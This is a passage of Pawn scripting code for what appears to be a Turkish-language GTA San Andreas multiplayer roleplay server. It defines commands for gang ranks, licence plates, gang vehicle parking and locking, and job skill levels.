				format(string, sizeof(string), "* Aile lideri %s seni aileden attý.",GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[giveplayerid][pGang] = 255;
				PlayerInfo[giveplayerid][pRank] = 0;
				FamilyInfo[family][FamilyMembers] --;
				SaveFamilies();
				format(string, sizeof(string), "%s, %s adlý kiþiyi %d ailesinden attý.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), family+1);
				Log("logs/family.log", string);
				return 1;
			} else SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
		} else if(strcmp(choice,"rank",true) == 0) {
			SendClientMessage(playerid, COLOR_WHITE, "Hata! Lütfen /ayarla yerine /rutbeayarla komutunu kullan.");
		} else if(strcmp(choice,"rankname",true) == 0) {
			SendClientMessage(playerid, COLOR_WHITE, "Hata! Lütfen /ayarla yerine /rutbeadiayarla komutunu kullan.");
		}
	} else SendClientMessage(playerid, COLOR_GREY, "   Bu komutu kullanabilmek için yeterli rütbede deðilsiniz.");
	return 1;
}

CMD:rutbeayarla(playerid, params[])
{
	if(PlayerInfo[playerid][pGang] == 255)
		return SendClientMessage(playerid, COLOR_GREY, "Bir ailede deðilsin.");

	new
		string[128],
		rank,
		giveplayerid;

	if(sscanf(params, "du", rank, giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /rutbeayarla [RankNum] [Oyuncu ID/Ýsim]");


	if(PlayerInfo[playerid][pRank] >= 5) {
		if(rank < 1 || rank > PlayerInfo[playerid][pRank]) {
		    format(string, sizeof(string),"Rank numarasý 1'den %d'a kadar olmalý.", PlayerInfo[playerid][pRank]);
			return SendClientMessage(playerid, COLOR_GREY, string);
		}

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pGang] != PlayerInfo[playerid][pGang])
				return SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu ailende deðil.");

			if(PlayerInfo[giveplayerid][pRank] > PlayerInfo[playerid][pRank])
				return SendClientMessage(playerid, COLOR_GREY, "Senden yüksek rütbeler üzerinde ayarlama yapamazsýn.");

			format(string, sizeof(string), "* %s adlý kiþiye %d rütbesini verdin.",GetPlayerNameEx(giveplayerid), rank);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

			format(string, sizeof(string), "* Aile lideri %s sana %d rütbesini verdi.",GetPlayerNameEx(playerid),rank);
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);

			format(string, sizeof(string), "%s, %d ailesindeki %s rütbesini %d'dan %d olarak deðiþtirdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid),PlayerInfo[giveplayerid][pRank], rank, (PlayerInfo[playerid][pGang]+1));
			Log("logs/family.log", string);
			PlayerInfo[giveplayerid][pRank] = rank;
			return 1;
		} else SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
	} else SendClientMessage(playerid, COLOR_GREY, "   Bu komutu kullanabilmek için yeterli rütbede deðilsiniz.");
	return 1;
}

CMD:gizlinumara(playerid, params[])
{
    if(PlayerInfo[playerid][pNumber] != 0 && PlayerInfo[playerid][pDonator] >= 1)
	{
        if(PhonePrivacy[playerid] == 1)
		{
            PhonePrivacy[playerid] = 0;
            SendClientMessage(playerid, COLOR_WHITE, "Gizli numara özelliðini iptal ettin.");
        }
        else
		{
            PhonePrivacy[playerid] = 1;
            SendClientMessage(playerid, COLOR_WHITE, "Gizli numara özelliðini aktif ettin.");
        }
    } else SendClientMessage(playerid, COLOR_GREY, "Bu komut yalnýzca VIP'ler tarafýndan kullanýlabilir.");
    return 1;
}

CMD:plakaal(playerid, params[])
{
if(IsPlayerInRangeOfPoint(playerid,3.0,844.2158,-599.0760,18.4219)) // X Y Z kendine Göre Ayarla
{
if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,-1,"Araçta Deðilsiniz");
if(GetPlayerMoney(playerid) < 5000) return SendClientMessage(playerid,-1, "Yeterli Paranýz Yok");
new Float:x,Float:y,Float:z;
new aracID;
new plakaCek[32];
new rasgelePlaka = 1000 + random(8999);
new rand = random(5);
switch(rand)
{
case 0: format(plakaCek, sizeof(plakaCek),"ERRZ %d",rasgelePlaka);
case 1: format(plakaCek, sizeof(plakaCek),"LSRF %d",rasgelePlaka);
case 2: format(plakaCek, sizeof(plakaCek),"LM %d",rasgelePlaka);
case 3: format(plakaCek, sizeof(plakaCek),"NJMC %d",rasgelePlaka);
case 4: format(plakaCek, sizeof(plakaCek),"VGBB %d",rasgelePlaka);
case 5: format(plakaCek, sizeof(plakaCek),"TYGG %d",rasgelePlaka);
case 6: format(plakaCek, sizeof(plakaCek),"AGZR %d",rasgelePlaka);
case 7: format(plakaCek, sizeof(plakaCek),"PCAL %d",rasgelePlaka);
case 8: format(plakaCek, sizeof(plakaCek),"LSBC %d",rasgelePlaka);
case 9: format(plakaCek, sizeof(plakaCek),"YUVC %d",rasgelePlaka);
case 10: format(plakaCek, sizeof(plakaCek),"ZAN %d",rasgelePlaka);
case 11: format(plakaCek, sizeof(plakaCek),"SAAZ %d",rasgelePlaka);
case 12: format(plakaCek, sizeof(plakaCek),"LZK %d",rasgelePlaka);
case 13: format(plakaCek, sizeof(plakaCek),"VBOF %d",rasgelePlaka); // benim bi iþim çýktý gelince yaparýz
}
for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId]))
GetPlayerPos(PlayerVehicleInfo[playerid][d][pvId], PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
GetVehicleZAngle(PlayerVehicleInfo[playerid][d][pvId], PlayerInfo[playerid][pPos_r]);
aracID = GetPlayerVehicleID(playerid); // AracYaratmaKodu nu kendi sisteminize göre düzenleyin
GetPlayerPos(playerid,x,y,z);
SetVehicleNumberPlate(aracID, plakaCek); // AracYaratmaKodu nu kendi sisteminize göre düzenleyin
SetVehicleToRespawn(aracID); // AracYaratmaKodu nu kendi sisteminize göre düzenleyin
SetPlayerPos(playerid,x,y,z);
SetVehiclePos(aracID,x,y,z); // AracYaratmaKodu nu kendi sisteminize göre düzenleyin
GivePlayerCash(playerid,-5000);
SendClientMessage(playerid,-1,"Plaka Satýn Aldýnýz [5000 $]");
PutPlayerInVehicle(playerid,aracID,0);
mysql_real_escape_string(plakaCek, plakaCek, g_MySQLConnections[0]); // bunun bi katkýsý olabilir mi?
for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
strmid(PlayerVehicleInfo[playerid][d][pvNumberPlate], plakaCek, 0, strlen(plakaCek), 32);

cmd_park(playerid, params);
}
return 1;
}


CMD:plakadegistir(playerid, params[]) {
	if(PlayerInfo[playerid][pDonator] < 1)
	    return SendClientMessage(playerid, COLOR_GREY, "Bu komutu yalnýzca VIP olanlar kullanabilir.");

	new
		color[32],
	    plate[32];

	if(sscanf(params, "s[32]s[32]", color, plate))
	{
        SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /plakadegistir [color] [new plate]");
		SendClientMessage(playerid, COLOR_GREY, "Available colors: {EFEFEF}default, black, white, blue, red, green, purple");
		SendClientMessage(playerid, COLOR_GREY, "{EFEFEF}yellow, lightblue, darkgreen, darkblue, darkgrey, darkbrown, pink");
		return 1;
	}
	new
	    Float: fVehicleHealth,
		iCount;

	for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++) {
		if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId])) {
		    iCount = 1;

		    GetVehicleHealth(PlayerVehicleInfo[playerid][d][pvId], fVehicleHealth);

		    if(fVehicleHealth < 800)
		        return SendClientMessage(playerid, COLOR_GREY, "Araca plaka koyabilmek için aracýnýn 800 HP'si olmalý.");

			if(strlen(plate) > 8)
			    return SendClientMessage(playerid, COLOR_GREY, "Araç plakasý 8 karakterden uzun olamaz.");

			mysql_real_escape_string(plate, plate, g_MySQLConnections[0]);

			if(strcmp(color, "black", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{000000}%s", plate);
			else if(strcmp(color, "white", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{FFFFFF}%s", plate);
			else if(strcmp(color, "blue", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{2641FE}%s", plate);
			else if(strcmp(color, "red", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{AA3333}%s", plate);
			else if(strcmp(color, "green", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{33AA33}%s", plate);
			else if(strcmp(color, "purple", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{C2A2DA}%s", plate);
			else if(strcmp(color, "yellow", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{FFFF00}%s", plate);
			else if(strcmp(color, "lightblue", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{33CCFF}%s", plate);
			else if(strcmp(color, "darkgreen", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{2D6F00}%s", plate);
			else if(strcmp(color, "darkblue", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{0B006F}%s", plate);
			else if(strcmp(color, "darkgrey", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{525252}%s", plate);
			else if(strcmp(color, "gold", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{B46F00}%s", plate);
			else if(strcmp(color, "darkbrown", true)==0||strcmp(color, "dennell", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{814F00}%s", plate);
			else if(strcmp(color, "darkred", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{750A00}%s", plate);
			else if(strcmp(color, "pink", true)==0) format(PlayerVehicleInfo[playerid][d][pvNumberPlate], 32, "{FF51F1}%s", plate);
			else strmid(PlayerVehicleInfo[playerid][d][pvNumberPlate], plate, 0, strlen(plate), 32);

		    GetPlayerPos(PlayerVehicleInfo[playerid][d][pvId], PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
		    GetVehicleZAngle(PlayerVehicleInfo[playerid][d][pvId], PlayerInfo[playerid][pPos_r]);

		    cmd_park(playerid, params);
		    //UpdatePlayerVehicleParkPosition(playerid, PlayerVehicleInfo[playerid][d][pvId], PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z], PlayerInfo[playerid][pPos_r], 1000.0);
		}
	}

	if(iCount != 1)
	    return SendClientMessage(playerid, COLOR_GREY, "Plakasýný deðiþtireceðin aracýn içinde olmalýsýn.");

	return 1;
}

CMD:rutbeadiayarla(playerid, params[])
{
	if(PlayerInfo[playerid][pGang] == 255)
	{
		SendClientMessage(playerid, COLOR_GREY, "Bir ailede deðilsin.");
		return 1;
	}
	new family = PlayerInfo[playerid][pGang];
	new string[128], rank, rankname[32];
	if(sscanf(params, "ds[32]", rank, rankname)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /rutbeadiayarla [rütbe numarasý 1-6] [rütbe adý]");

	if(PlayerInfo[playerid][pRank] == 6)
	{
		if(rank < 1 || rank > 6)
		{
			SendClientMessage(playerid, COLOR_GREY, "Rütbe numarasý 1 ile 6 arasýnda olmalýdýr.");
			return 1;
		}
		if(strlen(rankname) >= 19)
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Girdiðin rütbe adý çok uzun, 19 karakterden fazla kullanma.");
			return 1;
		}
		if(rank == 1)
		{
			strmid(FamilyInfo[family][FamilyRank1], rankname, 0, strlen(rankname), 32);
			SaveFamilies();
			format(string, sizeof(string), "* Rütbe 1'i %s olarak deðiþtirdin.",rankname);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		}
		if(rank == 2)
		{
			strmid(FamilyInfo[family][FamilyRank2], rankname, 0, strlen(rankname), 32);
			SaveFamilies();
			format(string, sizeof(string), "* Rütbe 2'yi %s olarak deðiþtirdin.",rankname);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		}
		if(rank == 3)
		{
			strmid(FamilyInfo[family][FamilyRank3], rankname, 0, strlen(rankname), 32);
			SaveFamilies();
			format(string, sizeof(string), "* Rütbe 3'ü %s olarak deðiþtirdin.",rankname);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		}
		if(rank == 4)
		{
			strmid(FamilyInfo[family][FamilyRank4], rankname, 0, strlen(rankname), 32);
			SaveFamilies();
			format(string, sizeof(string), "* Rütbe 4'ü %s olarak deðiþtirdin.",rankname);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		}
		if(rank == 5)
		{
			strmid(FamilyInfo[family][FamilyRank5], rankname, 0, strlen(rankname), 32);
			SaveFamilies();
			format(string, sizeof(string), "* Rütbe 5'i %s olarak deðiþtirdin.",rankname);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		}
		if(rank == 6)
		{
			strmid(FamilyInfo[family][FamilyRank6], rankname, 0, strlen(rankname), 32);
			SaveFamilies();
			format(string, sizeof(string), "* Rütbe 6'yý %s olarak deðiþtirdin.",rankname);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		}

		format(string, sizeof(string), "%s adjusted family %d's rank %d to %s", GetPlayerNameEx(playerid), family+1, rank, rankname);
		Log("logs/family.log", string);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   Bu komutu kullanabilmek için yeterli rütbede deðilsiniz.");
		return 1;
	}
	return 1;
}

CMD:ailepark(playerid, params[])
{
	new string[128];

    new f = PlayerInfo[playerid][pGang];
	if(f == 255) return SendClientMessage(playerid, COLOR_GRAD2, "Bir ailede deðilsin.");
	if(PlayerInfo[playerid][pRank] < 5) return SendClientMessage(playerid, COLOR_GRAD2, "Ailede en az R5 olmalýsýn.");
	for(new d = 0 ; d < MAX_GANG_VEHICLES; d++)
 	{
	    if(IsPlayerInVehicle(playerid, FamilyVehicleInfo[f][d][fvId]))
	    {
    		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Sürücü koltuðunda olman lazým.");
	        new Float:x, Float:y, Float:z, Float:angle, Float:health;
	        GetVehicleHealth(FamilyVehicleInfo[f][d][fvId], health);
	        if(health < 800) return SendClientMessage(playerid, COLOR_GREY, "Aracýn parketmek için çok hasarlý.");
	        if(PlayerInfo[playerid][pLockCar] == GetPlayerVehicleID(playerid)) PlayerInfo[playerid][pLockCar] = INVALID_VEHICLE_ID;
            GetVehiclePos(FamilyVehicleInfo[f][d][fvId], x, y, z);
           	GetVehicleZAngle(FamilyVehicleInfo[f][d][fvId], angle);
            SurfingCheck(GetPlayerVehicleID(playerid));
            UpdateGangVehicleParkPosition(f, d, x, y, z, angle, health, 1);
  			FamilyVehicleInfo[f][d][fvSpawnx] = x;
			FamilyVehicleInfo[f][d][fvSpawny] = y;
			FamilyVehicleInfo[f][d][fvSpawnz] = z;
			FamilyVehicleInfo[f][d][fvSpawna] = angle;
			PutPlayerInVehicle(playerid, FamilyVehicleInfo[f][d][fvId], 0);
            format(string, sizeof(string), "* %s aracýný parketti.", GetPlayerNameEx(playerid));
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            SaveFamiliesHQ();
            return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GREY, "Sahip olduðun aracýn içerisinde olmalýsýn.");
	return 1;
}

CMD:gkilit(playerid, params[])
{
    new Float: x, Float: y, Float: z;
	new f = PlayerInfo[playerid][pGang];
	if(f == 255) return SendClientMessage(playerid, COLOR_GRAD2, "Bir ailede deðilsin.");
	for(new d = 0 ; d < MAX_GANG_VEHICLES; d++)
    {
		if(FamilyVehicleInfo[f][d][fvId] != 0) GetVehiclePos(FamilyVehicleInfo[f][d][fvId], x, y, z);
  		if(IsPlayerInRangeOfPoint(playerid, 3.0, x, y, z))
    	{
        	if(FamilyVehicleInfo[f][d][fvLock] > 0 && FamilyVehicleInfo[f][d][fvLocked] == 0)
         	{
          		GameTextForPlayer(playerid,"~r~Arac kitlendi!",5000,6);
            	PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
             	FamilyVehicleInfo[f][d][fvLocked] = 1;
              	LockGangVehicle(f, FamilyVehicleInfo[f][d][fvId], FamilyVehicleInfo[f][d][fvLock]);
               	return 1;
			}
			else if(FamilyVehicleInfo[f][d][fvLock] > 0 && FamilyVehicleInfo[f][d][fvLocked] == 1)
   			{
      			GameTextForPlayer(playerid,"~g~Aracin kilidi acildi!",5000,6);
         		PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
           		FamilyVehicleInfo[f][d][fvLocked] = 0;
             	UnLockGangVehicle(f, FamilyVehicleInfo[f][d][fvId], FamilyVehicleInfo[f][d][fvLock]);
              	return 1;
			}
   			SendClientMessage(playerid, COLOR_GREY, "Aracýnda bir kilit sistemin yok");
      		return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GREY, "Ailenin sahip olduðu bir aracýn yakýnýnda deðilsin.");
	return 1;
}

CMD:gkilital(playerid, params[])
{
    new idx = GetPlayerVirtualWorld(playerid)-100;
    if(idx > 0 && idx < MAX_BIZ && BizInfo[idx][bType] != 1 || idx < 1 || idx > MAX_BIZ) return SendClientMessage(playerid, COLOR_GREY, "Herhangi bir iþ yerinin içinde deðilsin.");
   	if(BizInfo[idx][bType] == 1 && PlayerInfo[playerid][pGang] != 255 && PlayerInfo[playerid][pRank] >= 6)
    {
		ShowPlayerDialogEx(playerid, DIALOG_CDGLOCKBUY, DIALOG_STYLE_LIST, "24/7", "Alarm Kilidi 1000 $\nEndustriyel Kilit	1000 $", "Satýn Al", "Iptal");
	}
	else
	{
 		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmak için ailede olman ve R6 olman lazým.");
	}
	return 1;
}

CMD:yetenekler(playerid, params[])
{
	if(isnull(params))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /yetenekler [number]");
		SendClientMessage(playerid, COLOR_GREY, "| 1: Dedektif				7: Tamirci");
		SendClientMessage(playerid, COLOR_GREY, "| 2: Avukat				8: Boksör");
		SendClientMessage(playerid, COLOR_GREY, "| 3: Hayat Kadýný			9: Balýkçý");
		SendClientMessage(playerid, COLOR_GREY, "| 4: Uyuþturucu Satýcýsý	10: Kamyoncu");
		SendClientMessage(playerid, COLOR_GREY, "| 5: Uyuþturucu Kaçakçýsý	11: Araç Hýrsýzý");
		SendClientMessage(playerid, COLOR_GREY, "| 6: Silah Satýcýsý");
		//SendClientMessage(playerid, COLOR_GREY, "| 6: Arms Dealer											   12: Craftsman");
		return 1;
	}
	else switch(strval(params)) {
		case 1: //Detective
		{
			new level = PlayerInfo[playerid][pDetSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Dedektiflik levelin artýk = 1"); format(string, sizeof(string), "Level atlamak için %d kiþi daha bulmalýsýnýz.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Dedektiflik levelin artýk = 2"); format(string, sizeof(string), "Level atlamak için %d kiþi daha bulmalýsýnýz.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Dedektiflik levelin artýk = 3"); format(string, sizeof(string), "Level atlamak için %d kiþi daha bulmalýsýnýz.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Dedektiflik levelin artýk = 4"); format(string, sizeof(string), "Level atlamak için %d kiþi daha bulmalýsýnýz.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Dedektiflik levelin artýk = 5"); }
		}
		case 2://Lawyer
		{
			new level = PlayerInfo[playerid][pLawSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Avukatlýk levelin artýk = 1"); format(string, sizeof(string), "Level atlamak için %d kiþiyi daha serbest býrakmalýsýnýz.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Avukatlýk levelin artýk = 2"); format(string, sizeof(string), "Level atlamak için %d kiþiyi daha serbest býrakmalýsýnýz.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Avukatlýk levelin artýk = 3"); format(string, sizeof(string), "Level atlamak için %d kiþiyi daha serbest býrakmalýsýnýz.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Avukatlýk levelin artýk = 4"); format(string, sizeof(string), "Level atlamak için %d kiþiyi daha serbest býrakmalýsýnýz.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Avukatlýk levelin artýk = 5"); }
		}
		case 3://Whore
		{
			new level = PlayerInfo[playerid][pSexSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Hayat kadýný levelin artýk = 1"); format(string, sizeof(string), "Level atlamak için %d kere daha sex yapmalýsýn.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Hayat kadýný levelin artýk = 2"); format(string, sizeof(string), "Level atlamak için %d kere daha sex yapmalýsýn.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Hayat kadýný levelin artýk = 3"); format(string, sizeof(string), "Level atlamak için %d kere daha sex yapmalýsýn.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Hayat kadýný levelin artýk = 4"); format(string, sizeof(string), "Level atlamak için %d kere daha sex yapmalýsýn.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Hayat kadýný levelin artýk = 5"); }
		}
		case 4://Drugs Dealer
		{
			new level = PlayerInfo[playerid][pDrugsSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Uyuþturucu satýcýsý levelin artýk = 1"); format(string, sizeof(string), "Level atlamak için %d kiþiye daha uyuþturucu satmalýsýn.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Uyuþturucu satýcýsý levelin artýk = 2"); format(string, sizeof(string), "Level atlamak için %d kiþiye daha uyuþturucu satmalýsýn.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Uyuþturucu satýcýsý levelin artýk = 3"); format(string, sizeof(string), "Level atlamak için %d kiþiye daha uyuþturucu satmalýsýn.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Uyuþturucu satýcýsý levelin artýk = 4"); format(string, sizeof(string), "Level atlamak için %d kiþiye daha uyuþturucu satmalýsýn.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Uyuþturucu satýcýsý levelin artýk = 5"); }
		}
		case 5://Drug Smuggling
		{
			new level = PlayerInfo[playerid][pSmugSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Uyuþturucu kaçakçýsý levelin artýk = 1"); format(string, sizeof(string), "Level atlamak için %d kere daha uyuþturucu kaçakçýlýðý yapmalýsýn.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Uyuþturucu kaçakçýsý levelin artýk = 2"); format(string, sizeof(string), "Level atlamak için %d kere daha uyuþturucu kaçakçýlýðý yapmalýsýn.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Uyuþturucu kaçakçýsý levelin artýk = 3"); format(string, sizeof(string), "Level atlamak için %d kere daha uyuþturucu kaçakçýlýðý yapmalýsýn.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Uyuþturucu kaçakçýsý levelin artýk = 4"); format(string, sizeof(string), "Level atlamak için %d kere daha uyuþturucu kaçakçýlýðý yapmalýsýn.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Uyuþturucu kaçakçýsý levelin artýk = 5"); }
		}
		case 6://Arms Dealer
		{
			new level = PlayerInfo[playerid][pArmsSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Silah satýcýsý levelin artýk = 1"); format(string, sizeof(string), "Level atlamak için %d silah daha satmalýsýnýz.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Silah satýcýsý levelin artýk = 2"); format(string, sizeof(string), "Level atlamak için %d silah daha satmalýsýnýz.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Silah satýcýsý levelin artýk = 3"); format(string, sizeof(string), "Level atlamak için %d silah daha satmalýsýnýz.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Silah satýcýsý levelin artýk = 4"); format(string, sizeof(string), "Level atlamak için %d silah daha satmalýsýnýz.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Silah satýcýsý levelin artýk = 5"); }
		}
		case 7://arac Mechanic
		{
			new level = PlayerInfo[playerid][pMechSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Tamirci levelin artýk = 2"); format(string, sizeof(string), "Level atlamak için %d aracý daha tamir etmelisiniz.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Tamirci levelin artýk = 2"); format(string, sizeof(string), "Level atlamak için %d aracý daha tamir etmelisiniz.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Tamirci levelin artýk = 3"); format(string, sizeof(string), "Level atlamak için %d aracý daha tamir etmelisiniz.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Tamirci levelin artýk = 4"); format(string, sizeof(string), "Level atlamak için %d aracý daha tamir etmelisiniz.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Tamirci levelin artýk = 5"); }
		}
		case 8://Boxer
		{
			new level = PlayerInfo[playerid][pBoxSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Boksör levelin artýk = 1"); format(string, sizeof(string), "Level atlamak için %d maçý daha kazanmalýsýnýz.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Boksör levelin artýk = 2"); format(string, sizeof(string), "Level atlamak için %d maçý daha kazanmalýsýnýz.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Boksör levelin artýk = 3"); format(string, sizeof(string), "Level atlamak için %d maçý daha kazanmalýsýnýz.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Boksör levelin artýk = 4"); format(string, sizeof(string), "Level atlamak için %d maçý daha kazanmalýsýnýz.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Boksör levelin artýk = 5"); }
		}
		case 9://Fishing
		{
			new level = PlayerInfo[playerid][pFishSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Balýkçýlýk levelin artýk = 1"); format(string, sizeof(string), "Level atlamak için  %d balýk yakalamalýsýnýz.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
